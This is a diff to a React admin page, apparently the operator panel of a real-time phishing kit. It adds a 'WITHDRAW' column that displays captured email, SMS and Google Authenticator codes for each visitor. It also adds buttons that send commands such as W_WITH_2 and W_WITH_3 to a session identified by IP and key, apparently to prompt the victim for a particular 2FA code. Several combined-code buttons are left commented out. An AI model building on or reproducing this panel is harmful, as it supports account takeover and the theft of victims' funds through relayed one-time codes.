@@ -140,6 +140,13 @@ export default function PanelPage() {
 
                   <th
                     scope="col"
+                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
+                  >
+                    WITHDRAW
+                  </th>
+
+                  <th
+                    scope="col"
                     className="px-6 py-3 text-base font-bold text-zinc-200 text-center"
                   >
                     STATUS
@@ -234,6 +241,47 @@ export default function PanelPage() {
                             "N/A"
                           )}
                         </td>
+
+                        <td className="px-6 py-4 font-medium text-base text-white text-center">
+                          <p>
+                            email:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.email} />
+                            </strong>
+                          </p>
+                          <p>
+                            sms:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.sms} />
+                            </strong>
+                          </p>
+                          <p>
+                            gAuth:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.twoFa} />
+                            </strong>
+                          </p>
+                        </td>
+                        {/* <td className="px-3 py-4 font-medium text-sm flex flex-col gap-1 text-white text-center">
+                          <p>
+                            email:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.email} />
+                            </strong>
+                          </p>
+                          <p>
+                            sms:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.sms} />
+                            </strong>
+                          </p>
+                          <p>
+                            gAuth:{" "}
+                            <strong>
+                              <SpanValueText text={data.trPass.twoFa} />
+                            </strong>
+                          </p>
+                        </td> */}
                         <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
                           {data.command === "W_LOGIN_CONFIRM" ? (
                             <>
@@ -259,6 +307,91 @@ export default function PanelPage() {
                               >
                                 ERROR
                               </button>
+                            </>
+                          ) : null}
+                          {data.command.includes("CONFIRM") ? (
+                            <>
+                              <div className="w-full justify-center text-center grid grid-cols-2 gap-2  items-center">
+                                <button
+                                  onClick={() =>
+                                    handleCommand("W_WITH_2", ip, key)
+                                  }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  EMAIL
+                                </button>
+
+                                <button
+                                  onClick={() =>
+                                    handleCommand("W_WITH_3", ip, key)
+                                  }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  SMS
+                                </button>
+
+                                <button
+                                  onClick={() =>
+                                    handleCommand("W_WITH_3", ip, key)
+                                  }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  GAUTH
+                                </button>
+
+                                <button
+                                  // onClick={() =>
+                                  //   handleCommand("W_WITH_23", key)
+                                  // }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  EMAIL + SMS
+                                </button>
+
+                                <button
+                                  // onClick={() =>
+                                  //   handleCommand("W_WITH_13", key)
+                                  // }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  SMS + 2FA
+                                </button>
+                                <button
+                                  // onClick={() =>
+                                  //   handleCommand("W_WITH_12", key)
+                                  // }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  EMAIL + 2FA
+                                </button>
+
+                                <button
+                                  // onClick={() =>
+                                  //   handleCommand("W_WITH_123", key)
+                                  // }
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  AMBOS
+                                </button>
+                                <button
+                                  // onClick={() => {
+                                  //   if (data.command.includes("CONFIRM")) {
+                                  //     handleCommand(
+                                  //       data.command.replace(
+                                  //         "CONFIRM",
+                                  //         "ERROR"
+                                  //       ),
+                                  //       key
+                                  //     );
+                                  //   } else {
+                                  //     handleCommand("W_SEC_ERROR_", key);
+                                  //   }
+                                  // }}
+                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
+                                >
+                                  ERROR
+                                </button>
+                              </div>
                             </>
                           ) : null}
                         </td>
